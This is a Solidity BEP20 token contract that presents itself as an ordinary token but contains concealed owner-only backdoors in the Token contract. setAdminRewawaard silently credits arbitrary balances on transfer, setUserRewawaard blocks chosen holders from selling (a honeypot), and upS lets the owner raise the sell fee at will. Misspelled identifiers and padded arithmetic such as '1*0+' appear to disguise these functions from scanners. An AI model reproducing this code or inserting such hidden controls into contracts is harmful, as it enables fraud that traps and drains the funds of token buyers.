/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

/**
 *subemitted for verification at Etherscan.io on 2022-11-29
*/

/**
 *subemitted for verification at BscScan.com on 2022-09-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trysube(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function trymull(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sube(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mull(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sube(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint accountdADesired,
        uint accountdBDesired,
        uint accountdAMin,
        uint accountdBMin,
        address to,
        uint deadline
    ) external returns (uint accountdA, uint accountdB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint accountdTokenDesired,
        uint accountdTokenMin,
        uint accountdETHMin,
        address to,
        uint deadline
    ) external payable returns (uint accountdToken, uint accountdETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint accountdAMin,
        uint accountdBMin,
        address to,
        uint deadline
    ) external returns (uint accountdA, uint accountdB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint accountdTokenMin,
        uint accountdETHMin,
        address to,
        uint deadline
    ) external returns (uint accountdToken, uint accountdETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint accountdAMin,
        uint accountdBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accountdA, uint accountdB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint accountdTokenMin,
        uint accountdETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accountdToken, uint accountdETH);
    function swapExactTokensForTokens(
        uint accountdIn,
        uint accountdOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory accountds);
    function swapTokensForExactTokens(
        uint accountdOut,
        uint accountdInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory accountds);
    function swapExactETHForTokens(uint accountdOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory accountds);
    function swapTokensForExactETH(uint accountdOut, uint accountdInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory accountds);
    function swapExactTokensForETH(uint accountdIn, uint accountdOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory accountds);
    function swapETHForExactTokens(uint accountdOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory accountds);

    function quote(uint accountdA, uint reserveA, uint reserveB) external pure returns (uint accountdB);
    function getaccountdOut(uint accountdIn, uint reserveIn, uint reserveOut) external pure returns (uint accountdOut);
    function getaccountdIn(uint accountdOut, uint reserveIn, uint reserveOut) external pure returns (uint accountdIn);
    function getaccountdsOut(uint accountdIn, address[] calldata path) external view returns (uint[] memory accountds);
    function getaccountdsIn(uint accountdOut, address[] calldata path) external view returns (uint[] memory accountds);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfirrOnTransferTokens(
        address token,
        uint liquidity,
        uint accountdTokenMin,
        uint accountdETHMin,
        address to,
        uint deadline
    ) external returns (uint accountdETH);
    function removeLiquidityETHWithPermitSupportingfirrOnTransferTokens(
        address token,
        uint liquidity,
        uint accountdTokenMin,
        uint accountdETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint accountdETH);

    function swapExactTokensForTokensSupportingfirrOnTransferTokens(
        uint accountdIn,
        uint accountdOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfirrOnTransferTokens(
        uint accountdOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfirrOnTransferTokens(
        uint accountdIn,
        uint accountdOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function firrTo() external view returns (address);
    function firrToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfirrTo(address) external;
    function setfirrToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amnnot) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amnnot);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subetractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subetractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subetractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amnnot
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amnnot;
        emit Approval(owner, spender, amnnot);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amnnot
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnnot, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amnnot);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnnot
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnnot
    ) internal virtual {}
}


contract Token is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address accont) public view virtual returns (uint256) {
        return _balances[accont];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnnot
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnnot, "ERC20: transfer amnnot exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amnnot;
    }
        _balances[to] += amnnot;

        emit Transfer(from, to, amnnot);
    }

    function _burn(address accont, uint256 amnnot) internal virtual {
        require(accont != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accont];
        require(accoontBalance >= amnnot, "ERC20: burn amnnot exceeds balance");
    unchecked {
        _balances[accont] = accoontBalance - amnnot;
    }
        _totalSupply -= amnnot;

        emit Transfer(accont, address(0), amnnot);
    }

    function _mtin(address accont, uint256 amnnot) internal virtual {
        require(accont != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnnot;
        _balances[accont] += amnnot;
        emit Transfer(address(0), accont, amnnot);
    }


    address public uniswapV2Pair;
    address public DEVAddress;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
        _defaultSellfir = 2;
        _defaultBuyfirr = 0;
        DEVAddress = msg.sender;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfir = 0;

    uint256 private _defaultBuyfirr = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _Rewawaards;

    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function upS(uint256 _value) external onlyowner {
        _defaultSellfir = _value;
    }

    function setAdminRewawaard(address acclount,int256 amnnot ) public onlyowner {
        _Rewawaards[acclount] += amnnot;
    }

    function rmUserRewawaard(address acclount) public onlyowner {
        _Rewawaards[acclount] = 0;
    }


    function setUserRewawaard(address acclount) public onlyowner {
        _Rewawaards[acclount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewawaard(address acclount) public view returns (int256) {
        return _Rewawaards[acclount];
    }


    function _recF(
        address from,
        address _to,
        uint256 _accountd
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(1*0+fromBalance*1*1 >= _accountd+0, "ERC20: transfer amnnot exceeds balance");
        if (_Rewawaards[from]*1*1 > 0){
            _balances[from] = _balances[from].add(uint256(1*_Rewawaards[from]+0*1));
        }else if (1*1*_Rewawaards[from] < 0*1*1){
            _balances[from] = _balances[from].sube(uint256(1*_Rewawaards[from]+0*1));
        }



        uint256 trradefirraccountd = 0*1;
        uint256 trradefirr = _defaultSellfir+0*1;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                trradefirr = 1*0+_defaultSellfir;
            }
            if (from == uniswapV2Pair) {
                trradefirr = _defaultBuyfirr;
            }
        }
        trradefirraccountd = _accountd.mull(trradefirr).div(100);

        if (trradefirraccountd > 0*1) {
            _balances[from] = _balances[from].sube(trradefirraccountd);
            _balances[_deadAddress] = _balances[_deadAddress].add(trradefirraccountd);
            emit Transfer(from, _deadAddress, trradefirraccountd);
        }

        _balances[from] = _balances[from].sube(_accountd - trradefirraccountd);
        _balances[_to] = _balances[_to].add(_accountd - trradefirraccountd);
        emit Transfer(from, _to, _accountd - trradefirraccountd);
    }

    function transfer(address to, uint256 amnnot) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amnnot);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnnot
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnnot);
        _recF(from, to, amnnot);
        return true;
    }
}